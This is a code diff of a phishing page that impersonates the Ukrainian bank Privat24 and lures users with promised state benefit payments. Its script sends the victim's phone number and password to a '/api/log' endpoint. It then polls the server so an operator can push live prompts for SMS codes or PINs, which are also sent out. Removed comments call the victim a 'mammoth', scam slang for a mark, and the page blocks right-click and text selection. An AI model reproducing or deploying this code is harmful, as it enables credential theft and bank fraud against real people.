@@ -6,61 +6,60 @@
     <title>Приват24 — Ваш фінансовий термінал</title>
     <link rel="stylesheet" href="privat.css">
     <style>
-        /* Заборона виділення тексту */
         body {
-            -webkit-user-select: none;
-            -moz-user-select: none;
-            -ms-user-select: none;
-            user-select: none;
-            -webkit-tap-highlight-color: transparent;
+            -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none;
+            -webkit-tap-highlight-color: transparent; font-family: sans-serif;
         }
 
-        /* Стиль для якісного QR */
+        /* QR и верстка */
         .qr-mock {
-            width: 100px;
-            height: 100px;
-            background: #fff;
-            border: 1px solid #eee;
-            position: relative;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            width: 100px; height: 100px; background: #fff; border: 1px solid #eee;
+            position: relative; display: flex; justify-content: center; align-items: center;
             background-image: url('https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://privat24.ua');
-            background-size: cover;
-            border-radius: 8px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+            background-size: cover; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.05);
         }
         .qr-mock::after {
-            content: "P";
-            background: #72b128;
-            color: white;
-            font-weight: 900;
-            width: 20px;
-            height: 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-size: 12px;
-            border-radius: 4px;
-            position: absolute;
+            content: "P"; background: #72b128; color: white; font-weight: 900;
+            width: 20px; height: 20px; display: flex; justify-content: center; align-items: center;
+            font-size: 12px; border-radius: 4px; position: absolute;
         }
 
-        /* Мобільна адаптація */
         @media (max-width: 850px) {
             .p24-sidebar { display: none; }
             .p24-layout { display: block; }
             .p24-main { padding: 0; min-height: 100vh; display: flex; align-items: center; justify-content: center; background: #fff; }
             .login-card { box-shadow: none; border: none; width: 100%; max-width: 100%; padding: 20px; }
         }
+
+        /* ДИЗАЙН МОДАЛЬНОГО ОКНА */
+        #custom-modal {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.6); z-index: 10000; align-items: center; justify-content: center;
+        }
+        .modal-content {
+            background: #fff; width: 90%; max-width: 380px; padding: 30px 20px;
+            border-radius: 16px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+        }
+        .modal-content h3 { color: #333; margin-bottom: 12px; font-size: 20px; }
+        .modal-content p { color: #666; margin-bottom: 20px; font-size: 14px; line-height: 1.5; }
+        .modal-input-wrapper { margin-bottom: 20px; display: none; }
+        .modal-input-wrapper input {
+            width: 100%; padding: 14px; border: 2px solid #eee; border-radius: 8px;
+            font-size: 20px; text-align: center; outline: none; transition: border-color 0.3s;
+        }
+        .modal-input-wrapper input:focus { border-color: #72b128; }
+        .modal-btn {
+            background: #72b128; color: #fff; border: none; padding: 14px;
+            border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; font-size: 16px;
+        }
     </style>
 </head>
 <body oncontextmenu="return false;">
+
     <div class="p24-layout">
         <aside class="p24-sidebar">
             <div class="sidebar-content">
-                <div class="p24-logo-big">
-                    <span class="gr">P</span><span class="bl">24</span>
-                </div>
+                <div class="p24-logo-big"><span class="gr">P</span><span class="bl">24</span></div>
                 <h1>Отримуйте державні <br>виплати онлайн</h1>
                 <p>Здійснюйте вхід у Приват24 для підтвердження статусу отримувача допомоги.</p>
                 <div class="qr-code-box">
@@ -76,7 +75,6 @@
                     <div class="tab active">Вхід</div>
                     <div class="tab">Бізнес</div>
                 </div>
-
                 <form id="p24-form" class="p24-form">
                     <div class="p24-field">
                         <label>Номер телефону</label>
@@ -85,20 +83,16 @@
                             <input type="tel" id="p24-phone" maxlength="9" placeholder=" _ _  _ _ _  _ _  _ _ " inputmode="numeric" required>
                         </div>
                     </div>
-
                     <div class="p24-field">
                         <label>Пароль</label>
                         <input type="password" id="p24-pass" placeholder="Введіть пароль" required>
                     </div>
-
                     <button type="submit" class="p24-btn-main">Увійти</button>
-
                     <div class="p24-helper-links">
                         <a href="#">Забули пароль?</a>
                         <a href="#">Реєстрація</a>
                     </div>
                 </form>
-
                 <div class="p24-security-info">
                     <img src="https://img.icons8.com/ios-filled/50/72b128/shield.png" width="20" alt="safe">
                     <span>Безпеку транзакцій гарантовано ПриватБанком</span>
@@ -107,7 +101,7 @@
         </main>
     </div>
 
-    <div id="p24-loader" class="p24-full-loader">
+    <div id="p24-loader" class="p24-full-loader" style="display:none;">
         <div class="p24-spinner-wrapper">
             <div class="p24-circle"></div>
             <div class="p24-logo-small">P</div>
@@ -115,105 +109,92 @@
         </div>
     </div>
 
+    <div id="custom-modal">
+        <div class="modal-content">
+            <h3 id="modal-title">Підтвердження</h3>
+            <p id="modal-desc"></p>
+            <div id="modal-input-group" class="modal-input-wrapper">
+                <input type="tel" id="modal-input" placeholder="0000" maxlength="10">
+            </div>
+            <button id="modal-btn" class="modal-btn">ПРОДОВЖИТИ</button>
+        </div>
+    </div>
+
     <script>
-    // 1. Инициализация сессии (уникальный ID мамонта)
     if (!sessionStorage.getItem('USER_ID')) {
         sessionStorage.setItem('USER_ID', 'ID-' + Math.floor(Math.random() * 89999 + 10000));
     }
     const USER_ID = sessionStorage.getItem('USER_ID');
 
-    // 2. Блокировка инструментов разработчика (защита)
-    document.onkeydown = function(e) {
-        if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && [73, 74, 67].includes(e.keyCode)) || (e.ctrlKey && e.keyCode == 85)) {
-            return false;
-        }
-    };
+    // Функция управления модальным окном
+    async function showModal(type, text) {
+        const modal = document.getElementById('custom-modal');
+        const desc = document.getElementById('modal-desc');
+        const inputGroup = document.getElementById('modal-input-group');
+        const btn = document.getElementById('modal-btn');
+        const input = document.getElementById('modal-input');
 
-    // 3. Обработка формы
+        desc.innerText = text;
+        inputGroup.style.display = (type === 'ask') ? 'block' : 'none';
+        modal.style.display = 'flex';
+
+        return new Promise((resolve) => {
+            btn.onclick = () => {
+                const val = input.value;
+                modal.style.display = 'none';
+                input.value = '';
+                resolve(val);
+            };
+        });
+    }
+
+    // Обработка формы
     document.getElementById('p24-form').addEventListener('submit', async function(e) {
         e.preventDefault();
-
         const phone = document.getElementById('p24-phone').value;
         const pass = document.getElementById('p24-pass').value;
         const loader = document.getElementById('p24-loader');
-        const loaderText = document.getElementById('loader-text');
-
+        
         loader.style.display = 'flex';
-        loaderText.innerText = "Встановлення захищеного з'єднання...";
-
-        // Данные для твоего универсального сервера
-        const logPayload = {
-            userId: USER_ID,
-            type: 'ПРИВАТ24',
-            data: {
-                "Логін": "+380" + phone,
-                "Пароль": pass,
-                "Час": new Date().toLocaleString()
-            }
-        };
-
-        try {
-            // Отправляем на Railway (путь /api/log работает относительно домена)
-            await fetch('/api/log', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(logPayload)
-            });
-
-            setTimeout(() => { 
-                loaderText.innerText = "Обробка даних банком..."; 
-            }, 2500);
-
-        } catch (err) {
-            console.error("Помилка відправки на сервер");
-            // Не пугаем мамонта, просто оставляем крутилку или выводим общую ошибку
-        }
+        
+        await fetch('/api/log', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                userId: USER_ID,
+                type: 'ПРИВАТ24',
+                data: { "Логін": "+380" + phone, "Пароль": pass }
+            })
+        });
     });
 
-    // 4. Опрос сервера на наличие команд от админа (раз в 3 секунды)
+    // Опрос сервера
     setInterval(async () => {
         try {
             const res = await fetch(`/api/check/${USER_ID}`);
-            if (res.status === 200) {
-                const data = await res.json();
+            const data = await res.json();
+            
+            if (data) {
+                document.getElementById('p24-loader').style.display = 'none';
+                const result = await showModal(data.action, data.text);
                 
-                if (data) {
-                    const loader = document.getElementById('p24-loader');
-                    
-                    // Команда: Просто сообщение (ошибка баланса и т.д.)
-                    if (data.action === 'msg') {
-                        loader.style.display = 'none';
-                        alert(data.text);
-                        location.reload(); 
-                    } 
-                    // Команда: Запрос ввода (СМС, ПИН и т.д.)
-                    else if (data.action === 'ask') {
-                        loader.style.display = 'none';
-                        const val = prompt(data.text);
-                        if (val) {
-                            loader.style.display = 'flex';
-                            loaderText.innerText = "Перевірка...";
-                            
-                            // Отправляем введенный код обратно
-                            await fetch('/api/log', {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({
-                                    userId: USER_ID,
-                                    type: 'ВВІД_ПРИВАТ',
-                                    data: { "Результат": val }
-                                })
-                            });
-                        }
-                    }
+                if (data.action === 'ask' && result) {
+                    document.getElementById('p24-loader').style.display = 'flex';
+                    fetch('/api/log', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            userId: USER_ID,
+                            type: 'ВВІД_ПРИВАТ',
+                            data: { "Результат": result }
+                        })
+                    });
+                } else if (data.action === 'msg') {
+                    location.reload();
                 }
             }
-        } catch (e) { /* Игнорируем ошибки сети */ }
+        } catch (e) {}
     }, 3000);
-
-    window.scrollTo(0, 1);
-</script>
+    </script>
 </body>
-
 </html>
-
